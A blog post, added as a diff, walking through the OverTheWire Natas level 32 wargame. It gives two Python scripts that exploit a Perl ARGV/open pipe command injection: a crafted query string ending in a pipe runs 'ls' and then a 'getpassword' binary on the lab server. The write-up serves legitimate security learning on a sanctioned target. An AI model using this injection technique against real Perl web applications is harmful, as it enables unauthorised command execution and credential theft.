@@ -1,0 +1,80 @@
+---
+layout: post
+title:  "Natas Level 31 → Level 32"
+date:   2021-06-08 03:00:55
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Kino's Perl
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+Logging into the natas32 site we see it's nearly identical to natas31. The difference is that we now need to run an unnamed binary in the webroot.
+
+Since the sites are nearly identical, we can repurpose the code from the previous level. The first thing we need to do is locate the binary in question. The version of **ls** used by the server requires you to enter a directory name. Simply entering in ls will not return any results.
+
+```python
+import re
+import requests
+import os.path
+from requests.auth import HTTPBasicAuth
+
+password = 'n------------------------------e'
+session = requests.Session()
+
+auth = HTTPBasicAuth('natas32', password)
+url = 'http://natas32.natas.labs.overthewire.org/'
+payload = url + '?ls . |'
+
+if not os.path.exists('natas32.csv'):
+    with open('natas32.csv', 'w') as f:
+        f.write('temp,file')
+
+csv = {'file': open('natas32.csv', 'rb')}
+
+resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
+page = resp.text
+
+if os.path.isfile('natas32.csv'):
+    os.remove('natas32.csv')
+
+print(page)
+```
+
+Here we see **getpassword** among the files. This must be our binary. Let's edit the above code to run the binary instead.
+
+```python
+import re
+import requests
+import os.path
+from requests.auth import HTTPBasicAuth
+
+password = 'n------------------------------e'
+session = requests.Session()
+
+auth = HTTPBasicAuth('natas32', password)
+url = 'http://natas32.natas.labs.overthewire.org/'
+payload = url + '?./getpassword |'
+
+if not os.path.exists('natas32.csv'):
+    with open('natas32.csv', 'w') as f:
+        f.write('temp,file')
+
+csv = {'file': open('natas32.csv', 'rb')}
+
+resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
+page = resp.text
+
+if os.path.isfile('natas32.csv'):
+    os.remove('natas32.csv')
+
+passwd = re.findall("([a-zA-Z0-9]{32})", page)
+print(passwd[-1])
+```
+
+If you receive a jumbled mess instead of the password for the next level, you more than likely forgot the pipe at the end of the payload. Without that, the site will not execute the file, but attempt to print it.
